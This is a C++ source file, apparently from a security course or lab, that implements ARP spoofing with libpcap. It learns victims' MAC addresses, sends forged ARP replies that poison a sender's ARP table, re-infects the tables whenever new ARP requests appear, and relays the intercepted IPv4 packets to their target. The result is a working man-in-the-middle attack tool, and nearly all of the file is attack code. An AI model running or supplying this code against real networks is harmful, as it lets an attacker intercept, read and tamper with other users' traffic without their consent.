#include <cstdio>
#include <pcap.h>
#include <pthread.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "findaddr.h"
#include "dictionary.h"


struct thrArg{

    uint32_t ip_send;
    uint32_t ip_tar;

};

struct IpHdr
{
    uint8_t dum0[2];
    uint16_t total_length;   /* total length */
    uint8_t dum1[5];
    uint8_t ip_p;            /* protocol */
    uint8_t dum2[2];
    
    uint32_t ip_src;	      /* src ip */
    uint32_t ip_dst;         /* dst ip */
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define ARP_SIZE 42


// Struct & Variable Setting
EthArpPacket packet;
struct pcap_pkthdr *pkth;
const u_char *pkt_data;
	
dictionary dic;
char ip_addr_att[20];	
uint8_t mac_addr_att[20];

struct EthHdr *eth_hdr;
struct ArpHdr *arp_hdr;
struct IpHdr *ip_hdr;

char proto[10];
int res;


void IntIpChar(char* tar, uint32_t value){
	sprintf(tar, "%u.%u.%u.%u",
		(value & 0xFF000000) >> 24,
		(value & 0x00FF0000) >> 16,
		(value & 0x0000FF00) >> 8,
		(value & 0x000000FF));
}


// Request & Recv Pairs Mac addr
void recv_mac(pcap_t* hd, char* sender, uint8_t* mac_att, char* ip_att, uint8_t* buf){

	EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;

	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Sender's Mac
	packet.eth_.smac_ = Mac(mac_att);        // Attacker's Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(mac_att);        // Attacker's Mac
	packet.arp_.sip_ = htonl(Ip(ip_att));    // Attacker's IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Sender's Mac
	packet.arp_.tip_ = htonl(Ip(sender));         // Sender's IP
	/*/////////                                        //////////*/
	
	// Send Packet
	res = pcap_sendpacket(hd, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
		exit(1);
	}
	
	// Capture Packet
	while(1){
		
		printf("trying packet capture...\n");
		res = pcap_next_ex(hd, &pkth, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(hd));
			exit(1);
		}

		
		eth_hdr = (EthHdr*)pkt_data;
		if(ntohs(eth_hdr->type_) != EthHdr::Arp) continue;
		
		arp_hdr = (ArpHdr*)(eth_hdr+1);
		if(ntohl(arp_hdr->sip_) != Ip(sender) || ntohs(arp_hdr->op_) != ArpHdr::Reply || ntohs(arp_hdr->hrd_) != ArpHdr::ETHER) continue;
		
		break;
	}
	
	memcpy(buf, &arp_hdr->smac_, 6);
}

// Arp Spoof
void infection(pcap_t* hd, char* sender, char* target, char* ip_att, uint8_t* mac_send, uint8_t* mac_att){

	EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;
	
	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac(mac_send); // Sender's Mac
	packet.eth_.smac_ = Mac(mac_att);  // Attacker's Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(mac_att);  // Attacker's Mac
	packet.arp_.sip_ = htonl(Ip(target));   // Target's IP
	packet.arp_.tmac_ = Mac(mac_send); // Sender's Mac
	packet.arp_.tip_ = htonl(Ip(sender));   // Sender's IP
	/*/////////                                        //////////*/
	
	
	// Send Packet
	res = pcap_sendpacket(hd, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
		exit(1);
	}
	
	printf("\n****Sender's ARP Table is Infected!!****\n");
}

// Observe IPV4 or ARP and Reply or Reinfection
void* pth_relay(void* arg){

	thrArg *args = (thrArg*)arg;

	// Err Setting
	char errbuf[PCAP_ERRBUF_SIZE];

	EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;
	
	struct EthHdr *eth_hdr;
	struct ArpHdr *arp_hdr;
	struct IpHdr *ip_hdr;
	int res;
	
	char ip_send[20], ip_tar[20];
	uint8_t mac_send[20], mac_tar[20];
	
	uint8_t tmac[20];
	
	IntIpChar(ip_send, args->ip_send);
	IntIpChar(ip_tar, args->ip_tar);
	
	DICT_Load(dic, ip_send, mac_send);
	DICT_Load(dic, ip_tar, mac_tar);

	// Open PCAP
	pcap_t* hd = pcap_open_live(proto, ARP_SIZE, 1, 1, errbuf);
	if (hd == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", proto, errbuf);
		return 0;
	}
	
	while(1){
		
		res = pcap_next_ex(hd, &pkth, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(hd));
			return 0;
		}
	
		eth_hdr = (EthHdr*)pkt_data;
		
		// If packet is ARP
		if(ntohs(eth_hdr->type_) == EthHdr::Arp){
		
			arp_hdr = (ArpHdr*)(eth_hdr + 1);
			
			if(ntohl(Ip(arp_hdr->sip_)) == Ip(ip_send) && ntohl(Ip(arp_hdr->tip_)) == Ip(ip_tar) && ntohs(arp_hdr->op_) == ArpHdr::Request){
				printf("ARP!\n");
				
				/// Broadcast
				if(arp_hdr->tmac_ == Mac("00:00:00:00:00:00")){
					printf("broad\n");
					
					infection(hd, ip_send, ip_tar, ip_addr_att, mac_send, mac_addr_att);
					infection(hd, ip_tar, ip_send, ip_addr_att, mac_tar, mac_addr_att);
					
				}
				/// Unicast
				else{
					printf("Uni\n");
					
					infection(hd, ip_send, ip_tar, ip_addr_att, mac_send, mac_addr_att);
				}
				
			}	
		
		}
		// If packet is IPV4
		else if(ntohs(eth_hdr->type_) == EthHdr::Ip4){
			
			ip_hdr = (IpHdr*)(eth_hdr + 1);
			
			if(Ip(ip_tar) != Ip(ip_addr_att) && (uint32_t)Ip(ip_send) == ntohl(Ip(ip_hdr->ip_src))){
				
				printf("Relay\ndestination: %s\n\n", ip_tar);
				
				eth_hdr->smac_ = Mac(mac_addr_att);
				eth_hdr->dmac_ = Mac(mac_tar);
			
				res = pcap_sendpacket(hd, pkt_data, pkth->len);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
					return 0;
				}
			}

		}
		
	}

	pcap_close(hd);

}
